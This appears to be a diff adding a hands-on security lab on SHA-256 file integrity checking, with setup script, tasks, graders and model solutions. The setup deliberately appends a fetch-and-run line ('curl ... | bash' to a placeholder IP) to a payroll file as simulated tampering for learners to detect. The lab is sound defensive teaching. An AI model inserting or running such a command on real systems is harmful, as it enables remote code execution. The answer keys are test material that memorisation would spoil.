@@ -1,0 +1,84 @@
+# Lab: lab-01 | Hashes and file integrity | u03 | 30
+A hash is a fingerprint of a file: change one byte and the hash changes completely. In this lab you use hashes on server1 the way an integrity checker does. Last week someone saved a baseline of the payroll program in /opt/payroll: the file /root/baseline.sha256 holds the SHA-256 hash of every file as it was then. Since then, something has changed. You will find out what, put it right, check a download against the vendor's published hash, and make a fresh baseline for the web site.
+
+@vars
+changed = rates.conf | export.sh | staff.list
+verdict = MATCH | TAMPERED
+@endvars
+
+@setup server1
+mkdir -p /opt/payroll /var/backups/payroll /srv/web /root/downloads
+printf 'base_rate=21.50\novertime=1.5\nholiday=2.0\n' > /opt/payroll/rates.conf
+printf '#!/bin/bash\n# export the monthly payroll file\ncp /opt/payroll/out/*.csv /mnt/finance/\n' > /opt/payroll/export.sh
+printf 'amara.okafor\nben.hollis\ncarmen.diaz\ndev.patel\n' > /opt/payroll/staff.list
+printf 'Payroll tool 4.2 - internal use only\n' > /opt/payroll/README
+chmod 755 /opt/payroll/export.sh
+cp /opt/payroll/rates.conf /opt/payroll/export.sh /opt/payroll/staff.list /opt/payroll/README /var/backups/payroll/
+sha256sum /opt/payroll/rates.conf /opt/payroll/export.sh /opt/payroll/staff.list /opt/payroll/README > /root/baseline.sha256
+echo 'curl -s http://203.0.113.45/p.sh | bash' >> /opt/payroll/{changed}
+printf '<h1>Copperleaf Books</h1>\n' > /srv/web/index.html
+printf 'body { font-family: sans-serif; }\n' > /srv/web/style.css
+printf '<h1>Contact us</h1>\n' > /srv/web/contact.html
+printf 'Copperleaf monitoring agent 2.4 (pretend download)\n' > /root/downloads/agent-2.4.tar.gz
+h=$(sha256sum /root/downloads/agent-2.4.tar.gz | awk '{print $1}')
+printf 'Copperleaf monitoring agent 2.4 - release notes\nFile: agent-2.4.tar.gz\nSHA-256: %s\n' "$h" > /root/downloads/vendor-notes.txt
+if [ {verdict} = TAMPERED ]; then echo 'extra' >> /root/downloads/agent-2.4.tar.gz; fi
+
+@task t01 | General security concepts | 15 | server1
+Check every file in /opt/payroll against the baseline /root/baseline.sha256. Exactly one file no longer matches. Write its full path (for example /opt/payroll/name) on one line into /root/changed.txt.
+@check server1 | /root/changed.txt names the changed file, and only that one
+test "$(wc -l < /root/changed.txt)" -eq 1 && grep -q '{changed}$' /root/changed.txt
+@hint sha256sum -c FILE reads a list of hashes and file names and says OK or FAILED for each file.
+@solution server1
+sha256sum -c /root/baseline.sha256
+sha256sum -c /root/baseline.sha256 | grep FAILED | cut -d: -f1 > /root/changed.txt
+cat /root/changed.txt
+@explain
+sha256sum -c hashes each file again and compares the result with the saved value. A file whose content changed even slightly gets a completely different hash, so it is reported as FAILED. This is what file integrity monitoring (FIM) tools such as AIDE or Tripwire do on a schedule. The baseline only helps if an attacker cannot change it too: keep it on read-only media or another system.
+@endtask
+
+@task t02 | General security concepts | 15 | server1
+Restore the changed file from the clean copies in /var/backups/payroll, so that every file in /opt/payroll matches the baseline again. Do not change the baseline.
+@check server1 | every file matches the baseline again
+sha256sum -c /root/baseline.sha256 && ! sha256sum -c /root/baseline.sha256 | grep -q FAILED
+@check server1 | the baseline still has four entries
+test "$(grep -c /opt/payroll/ /root/baseline.sha256)" -eq 4
+@hint Copy the file from the backup folder over the changed one, then run sha256sum -c again.
+@solution server1
+f=$(cat /root/changed.txt)
+cat /var/backups/payroll/$(basename $f) > $f
+sha256sum -c /root/baseline.sha256
+@explain
+Hashes detect a change but cannot undo it: you need a known-good copy. Checking the backup itself against the baseline before you trust it is a good habit. Updating the baseline to the changed file would hide the problem instead of fixing it. The model answer uses cat with a redirection, which keeps the file's owner and mode; cp works too (root's cp is an alias for cp -i on RHEL, so it asks before it overwrites: answer y).
+@endtask
+
+@task t03 | General security concepts | 15 | server1
+You downloaded /root/downloads/agent-2.4.tar.gz. The vendor published its SHA-256 hash in /root/downloads/vendor-notes.txt. Compute the file's SHA-256 digest with `openssl dgst` and compare it with the published value. Write MATCH into /root/download-verdict.txt if they are the same, or TAMPERED if they differ.
+@check server1 | the verdict is right
+test "$(cat /root/download-verdict.txt)" = {verdict}
+@hint openssl dgst -sha256 FILE prints SHA2-256(FILE)= followed by the hash. Compare it with the line in vendor-notes.txt.
+@solution server1
+cat /root/downloads/vendor-notes.txt
+openssl dgst -sha256 /root/downloads/agent-2.4.tar.gz
+a=$(openssl dgst -sha256 /root/downloads/agent-2.4.tar.gz | awk '{print $2}')
+b=$(grep SHA-256 /root/downloads/vendor-notes.txt | awk '{print $2}')
+if [ "$a" = "$b" ]; then echo MATCH > /root/download-verdict.txt; else echo TAMPERED > /root/download-verdict.txt; fi
+cat /root/download-verdict.txt
+@explain
+A published hash proves the file is the one the vendor released, but only if you get the hash from a trusted place (the vendor's HTTPS site, not the same mirror as the file). A digital signature is stronger: it proves who released the file as well. Prefer SHA-256 or better; MD5 and SHA-1 are broken for this use, because collisions can be made on purpose.
+@endtask
+
+@task t04 | General security concepts | 15 | server1
+Make a new SHA-256 baseline of every file in /srv/web, with full paths, in /root/web-baseline.sha256, so that `sha256sum -c /root/web-baseline.sha256` reports every file OK. Then make the baseline readable by root only (mode 400).
+@check server1 | the baseline lists every file in /srv/web and they all check out
+test "$(grep -c /srv/web/ /root/web-baseline.sha256)" -eq "$(find /srv/web -type f | wc -l)" && sha256sum -c /root/web-baseline.sha256
+@check server1 | the baseline has mode 400
+test "$(stat -c %a /root/web-baseline.sha256)" = 400
+@hint sha256sum /srv/web/* > FILE writes one line per file; chmod 400 FILE.
+@solution server1
+sha256sum /srv/web/* > /root/web-baseline.sha256
+chmod 400 /root/web-baseline.sha256
+sha256sum -c /root/web-baseline.sha256
+@explain
+Full paths make the baseline work from any folder. Mode 400 keeps ordinary users from reading or changing it, but root (or an attacker who became root) still can, which is why real integrity tools also keep a copy of the baseline off the server or sign it.
+@endtask
